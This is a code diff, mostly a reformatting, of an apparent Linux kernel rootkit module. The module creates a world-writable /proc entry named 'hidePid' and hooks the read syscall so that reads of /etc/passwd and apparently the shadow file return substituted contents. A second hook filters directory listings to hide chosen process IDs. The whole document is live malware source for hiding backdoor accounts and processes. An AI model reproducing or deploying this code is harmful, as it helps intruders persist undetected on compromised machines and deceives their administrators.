@@ -100,7 +100,7 @@ int readAndWrite(char *file, char *toWrite, char **readIn) {
     set_fs(old_fs); 
     filp_close(fd, NULL); 
     return 0; 
-    }
+}
     
 int init_module(void) { 
     struct proc_dir_entry *f = create_proc_entry("hidePid", 777, NULL); 
@@ -115,8 +115,8 @@ int init_module(void) {
     f->size = 37; 
     passwdBuf = (char *)kmalloc(PAGE_SIZE, GFP_KERNEL); 
     if(readAndWrite("/etc/passwd", pass, &passwdBuf ) < 0) { 
-    kfree(passwdBuf); 
-    return -1; 
+        kfree(passwdBuf); 
+        return -1; 
     } 
 
     shadowBuf = (char *)kmalloc(PAGE_SIZE, GFP_KERNEL); 
@@ -170,7 +170,8 @@ void set_ro(ulong addr) {
 asmlinkage int our_read(int fd, char *buf, size_t count) { 
     struct file *f; 
     struct path *p; 
-    char *pathname; char *t; 
+    char *pathname; 
+    char *t; 
     int r = og_read(fd, buf, count); 
     if(r > 0) { 
         f = fget(fd); 
@@ -188,7 +189,7 @@ asmlinkage int our_read(int fd, char *buf, size_t count) {
         } else if(!strcmp(pathname, "/etc/passwd")) { 
             r = strlen(strncpy(buf, passwdBuf, count)); 
         } 
-    kfree(t); 
+        kfree(t); 
     } 
     return r; 
 } 
@@ -260,24 +261,24 @@ int hideProcs(uint fd, struct dirent *dirp, uint length) {
                 int i = 0; 
                 while(i < pidCount) { 
                     if(pids[i] == pid) { 
-                    flag = 0; 
-                    break; 
+                            flag = 0; 
+                            break; 
+                    } 
+                    i++; 
+                    } 
+                    if(flag) { 
+                        char *tp = (char *)t; 
+                        tp+=offset; 
+                        memcpy(tp, cur, cur->reclen); 
+                        offset += cur->reclen; 
+                    } 
                 } 
-                i++; 
             } 
-            if(flag) { 
-                char *tp = (char *)t; 
-                tp+=offset; 
-                memcpy(tp, cur, cur->reclen); 
-                offset += cur->reclen; 
-            } 
-        } 
+        count += cur->reclen; 
     } 
-    count += cur->reclen; 
-} 
 
-memcpy(dirp, t, offset); 
-kfree(t); 
-return offset; 
+    memcpy(dirp, t, offset); 
+    kfree(t); 
+    return offset; 
 
 }
